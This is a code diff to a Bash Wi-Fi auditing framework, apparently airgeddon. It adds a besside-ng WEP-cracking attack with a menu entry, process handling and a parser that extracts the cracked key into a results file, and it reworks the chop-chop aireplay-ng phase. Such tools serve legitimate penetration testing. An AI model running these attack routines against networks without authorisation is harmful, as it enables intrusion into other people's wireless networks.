@@ -73,6 +73,7 @@ optional_tools_names=(
 						"hcxdumptool"
 						"tshark"
 						"tcpdump"
+						"besside-ng"
 					)
 
 update_tools=("curl")
@@ -114,6 +115,7 @@ declare -A possible_package_names=(
 									[${optional_tools_names[24]}]="hcxdumptool" #hcxdumptool
 									[${optional_tools_names[25]}]="tshark / wireshark-cli / wireshark" #tshark
 									[${optional_tools_names[26]}]="tcpdump" #tcpdump
+									[${optional_tools_names[27]}]="aircrack-ng" #besside-ng
 									[${update_tools[0]}]="curl" #curl
 								)
 
@@ -193,6 +195,7 @@ wepdir="wep/"
 wep_attack_file="ag.wepattack.sh"
 wep_key_handler="ag.wep_key_handler.sh"
 wep_processes_file="wep_processes"
+wep_besside_log="ag.besside.log"
 
 #Docker vars
 docker_based_distro="Kali"
@@ -3572,6 +3575,27 @@ function validate_network_encryption_type() {
 	return 0
 }
 
+#Execute wep besside attack
+#shellcheck disable=SC2164
+function exec_wep_besside_attack() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 33 "yellow"
+	language_strings "${language}" 4 "read"
+
+	prepare_wep_attack "besside"
+
+	recalculate_windows_sizes
+	pushd "${tmpdir}" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF00FF\" -geometry ${g2_stdleft_window} -T \"WEP Besside-ng attack\"" "besside-ng -c \"${channel}\" -b \"${bssid}\" \"${interface}\" -v | tee \"${tmpdir}${wep_besside_log}\"" "WEP Besside-ng attack" "active"
+	wait_for_process "besside-ng -c \"${channel}\" -b \"${bssid//:/ }\" \"${interface}\" -v" "WEP Besside-ng attack"
+	popd "${tmpdir}" > /dev/null 2>&1
+
+	manage_wep_besside_pot
+}
+
 #Execute wep all-in-one attack
 #shellcheck disable=SC2164
 function exec_wep_allinone_attack() {
@@ -3582,7 +3606,7 @@ function exec_wep_allinone_attack() {
 	language_strings "${language}" 296 "yellow"
 	language_strings "${language}" 115 "read"
 
-	prepare_wep_attack
+	prepare_wep_attack "allinone"
 	set_wep_script
 
 	recalculate_windows_sizes
@@ -3615,23 +3639,31 @@ function kill_wep_windows() {
 	for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
 		kill "${item}" &> /dev/null
 	done
+
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 		kill_tmux_windows
 	fi
 }
 
-#Prepare wep attack deleting temp files
+#Prepare wep attacks deleting temp files
 function prepare_wep_attack() {
 
 	debug_print
 
-	rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
-	rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
-	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
-	rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
+	if [ "${1}" = "allinone" ]; then
+		rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
+		rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
+	else
+		rm -rf "${tmpdir}${wep_besside_log}" > /dev/null 2>&1
+		rm -rf "${tmpdir}wep.cap" > /dev/null 2>&1
+		rm -rf "${tmpdir}wps.cap" > /dev/null 2>&1
+		rm -rf "${tmpdir}besside.log" > /dev/null 2>&1
+	fi
 }
 
-#Create here-doc bash script used for key handling on wep all-in-one attack
+#Create here-doc bash script used for key handling on wep all-in-one and besside attacks
 function set_wep_key_script() {
 
 	debug_print
@@ -3699,7 +3731,7 @@ function set_wep_key_script() {
 		wep_key_found=0
 
 		#Check if the wep password was captured and manage to save it on a file
-		function manage_wep_pot() {
+		function manage_wep_allinone_pot() {
 
 			if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
 				wep_hex_key_cmd="cat \"${tmpdir}${wepdir}wepkey.txt\""
@@ -3719,11 +3751,7 @@ function set_wep_key_script() {
 				echo ""
 				echo -e "ASCII: \${wep_ascii_key}"
 				echo -en "${wep_texts[${language},3]}:"
-				echo -en " \${wep_hex_key}"
-				echo ""
-				} >> "${weppotenteredpath}"
-
-				{
+				echo -e " \${wep_hex_key}"
 				echo ""
 				echo "---------------"
 				echo ""
@@ -3781,7 +3809,7 @@ function set_wep_key_script() {
 		done
 
 		if [ "\${wep_key_found}" -eq 1 ]; then
-			manage_wep_pot
+			manage_wep_allinone_pot
 		fi
 
 		kill_wep_script_windows
@@ -3963,23 +3991,23 @@ function set_wep_script() {
 					wep_script_processes+=("\${wep_chopchop_phase2_pid}")
 					wep_chopchop_phase=3
 					;;
-					3)
-						wep_chopchop_phase2_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_chopchop_phase2_pid}$" 2> /dev/null)
-						if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
-							kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
-							manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
+				3)
+					wep_chopchop_phase2_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_chopchop_phase2_pid}$" 2> /dev/null)
+					if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
+						kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
+						manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
 
-							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-								get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
-								wep_script_processes+=("\${global_process_pid}")
-								global_process_pid=""
-							else
-								wep_script_processes+=("\$!")
-							fi
-
-							wep_chopchop_phase=4
+						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
+							wep_script_processes+=("\${global_process_pid}")
+							global_process_pid=""
+						else
+							wep_script_processes+=("\$!")
 						fi
-					;;
+
+						wep_chopchop_phase=4
+					fi
+				;;
 			esac
 			write_wep_processes
 		}
@@ -5176,8 +5204,8 @@ function michael_shutdown_option() {
 	exec_michaelshutdown
 }
 
-#Validate wep all-in-one attack parameters
-function wep_option() {
+#Validate wep all-in-one and besside-ng attacks parameters
+function wep_attack_option() {
 
 	debug_print
 
@@ -5208,7 +5236,11 @@ function wep_option() {
 	manage_wep_log
 	language_strings "${language}" 115 "read"
 
-	exec_wep_allinone_attack
+	if [ "${1}" = "allinone" ]; then
+		exec_wep_allinone_attack
+	else
+		exec_wep_besside_attack
+	fi
 }
 
 #Validate wps parameters for custom pin, pixie dust, bruteforce, pin database and null pin attacks
@@ -5659,7 +5691,8 @@ function initialize_menu_options_dependencies() {
 	bully_pixie_dust_attack_dependencies=("${optional_tools_names[14]}" "${optional_tools_names[15]}")
 	reaver_pixie_dust_attack_dependencies=("${optional_tools_names[13]}" "${optional_tools_names[15]}")
 	et_sniffing_sslstrip2_beef_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[16]}" "${optional_tools_names[17]}")
-	wep_attack_dependencies=("${optional_tools_names[2]}" "${optional_tools_names[18]}")
+	wep_attack_allinone_dependencies=("${optional_tools_names[2]}" "${optional_tools_names[18]}")
+	wep_attack_besside_dependencies=("${optional_tools_names[27]}")
 	enterprise_attack_dependencies=("${optional_tools_names[19]}" "${optional_tools_names[20]}" "${optional_tools_names[22]}")
 	asleap_attacks_dependencies=("${optional_tools_names[20]}")
 	john_attacks_dependencies=("${optional_tools_names[21]}")
@@ -5943,6 +5976,10 @@ function clean_tmpfiles() {
 		rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
 		rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
 		rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${wep_besside_log}" > /dev/null 2>&1
+		rm -rf "${tmpdir}wep.cap" > /dev/null 2>&1
+		rm -rf "${tmpdir}wps.cap" > /dev/null 2>&1
+		rm -rf "${tmpdir}besside.log" > /dev/null 2>&1
 	fi
 
 	if [ "${dhcpd_path_changed}" -eq 1 ]; then
@@ -7335,7 +7372,8 @@ function wep_attacks_menu() {
 	language_strings "${language}" 56
 	language_strings "${language}" 49
 	language_strings "${language}" 50 "separator"
-	language_strings "${language}" 423 wep_attack_dependencies[@]
+	language_strings "${language}" 423 wep_attack_allinone_dependencies[@]
+	language_strings "${language}" 723 wep_attack_besside_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " wep_option
@@ -7359,7 +7397,14 @@ function wep_attacks_menu() {
 			if contains_element "${wep_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				wep_option
+				wep_attack_option "allinone"
+			fi
+		;;
+		6)
+			if contains_element "${wep_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				wep_attack_option "besside"
 			fi
 		;;
 		*)
@@ -8686,6 +8731,55 @@ function manage_asleap_pot() {
 	fi
 }
 
+#Check if the wep besside password was captured and manage to save it on a file
+function manage_wep_besside_pot() {
+
+	debug_print
+
+	local wep_besside_pass_cracked=0
+	if grep -q "Got key" "${tmpdir}${wep_besside_log}" 2> /dev/null; then
+		sed -ri '1,/Got key/{/Got key/!d; s/.*(Got key)/\1/}' "${tmpdir}${wep_besside_log}" 2> /dev/null
+		readarray -t LINES_TO_PARSE < <(cat < "${tmpdir}${wep_besside_log}" 2> /dev/null)
+		for item in "${LINES_TO_PARSE[@]}"; do
+			if [[ "${item}" =~ Got[[:blank:]]key[[:blank:]]for.*\[([0-9A-F:]+)\].*IVs ]]; then
+				wep_hex_key="${BASH_REMATCH[1]}"
+				wep_ascii_key=$(echo "${wep_hex_key}" | awk 'RT{printf "%c", strtonum("0x"RT)}' RS='[0-9A-Fa-f]{2}')
+				wep_besside_pass_cracked=1
+				break
+			fi
+		done
+	fi
+
+	if [ "${wep_besside_pass_cracked}" -eq 1 ]; then
+		echo "" > "${weppotenteredpath}"
+		{
+		date +%Y-%m-%d
+		echo -e "${wep_texts[${language},1]}"
+		echo ""
+		echo -e "BSSID: ${bssid}"
+		echo -e "${wep_texts[${language},2]}: ${channel}"
+		echo -e "ESSID: ${essid}"
+		echo ""
+		echo "---------------"
+		echo ""
+		echo -e "ASCII: ${wep_ascii_key}"
+		echo -en "${wep_texts[${language},3]}:"
+		echo -en " ${wep_hex_key}"
+		echo ""
+		echo ""
+		echo "---------------"
+		echo ""
+		echo "${footer_texts[${language},0]}"
+		} >> "${weppotenteredpath}"
+
+		echo
+		language_strings "${language}" 162 "yellow"
+		echo
+		language_strings "${language}" 724 "blue"
+		language_strings "${language}" 115 "read"
+	fi
+}
+
 #Check if the passwords were captured using ettercap and manage to save them on a file
 function manage_ettercap_log() {
 
@@ -8748,7 +8842,7 @@ function manage_wps_log() {
 	done
 }
 
-#Check if the password was captured using wep all-in-one attack and manage to save it on a file
+#Check if the password was captured using wep all-in-one or besside-ng attack and manage to save it on a file
 function manage_wep_log() {
 
 	debug_print
@@ -16889,7 +16983,8 @@ function remove_warnings() {
 	echo "${reaver_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${bully_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${reaver_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
-	echo "${wep_attack_dependencies[@]}" > /dev/null 2>&1
+	echo "${wep_attack_allinone_dependencies[@]}" > /dev/null 2>&1
+	echo "${wep_attack_besside_dependencies[@]}" > /dev/null 2>&1
 	echo "${enterprise_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${asleap_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${john_attacks_dependencies[@]}" > /dev/null 2>&1
